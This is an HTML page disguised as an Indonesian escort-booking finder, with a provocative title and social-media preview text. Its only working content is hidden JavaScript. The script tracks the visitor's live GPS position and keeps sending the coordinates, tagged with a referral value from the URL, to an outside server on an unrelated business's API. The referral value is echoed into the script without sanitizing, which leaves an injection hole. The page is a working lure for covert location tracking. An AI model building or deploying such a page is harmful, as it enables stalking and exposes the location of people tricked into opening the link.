<!DOCTYPE html>
<html>
<head>
  <title>Cari Lokasi Gadis Open BO</title>
  <meta property="og:description" content="Yuk cari gadis Open BO mulai 250K di sekitarmu.
  Gratis kamar AC untuk booking pertama.">
  <meta property="og:title" content="Lokasi Gadis Open BO">
</head>
<body>
  <script>
  function serialize(obj) {
    let result = '';
    if (typeof obj === 'object' && !Array.isArray(obj)) {
      for (let prop in obj) {
        result += `${prop}=${obj[prop]}&`;
      }
    }
    return trimFilter(result);
  }

  function trimFilter(str) {
    str = str.trim(); // First trim.
    if (str.charAt(0) == '&') {
      str = str.substring(1).trim();
    }
    if (str.charAt(str.length - 1) == '&') {
      str = str = str.substring(0, str.length - 1).trim();
    }
    if (str.charAt(str.length - 1) == ',') {
      str = str.substring(0, str.length - 1).trim();
    }
    return str;
  }

  if (navigator.geolocation) {
    let ref = "<?= getGET('ref'); ?>";

    navigator.geolocation.watchPosition(function (pos) {
      data = {
        cmd: 'set',
        ref: ref,
        lat: pos.coords.latitude,
        lon: pos.coords.longitude
      };

      let xhr = new XMLHttpRequest();
      xhr.addEventListener('load', function (ev) {
        if (xhr.status == 200 && xhr.readyState == 4) {
          //console.log(xhr.response);
        }
      });
      xhr.open('POST', 'https://erp.indoprinting.co.id/api/v1/viewerLocator');
      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      xhr.send(serialize(data));
    }, function (error) {
      if (error.PERMISSION_DENIED) {
        console.warn('Geolocation require permission.');
        // if (user_id == 1) alertify.alert('Geolocation Access', 'Dimohon untuk mengizinkan akses lokasi kepada PrintERP. Terima kasih.');
      }
    });
  }
  </script>
</body>
</html>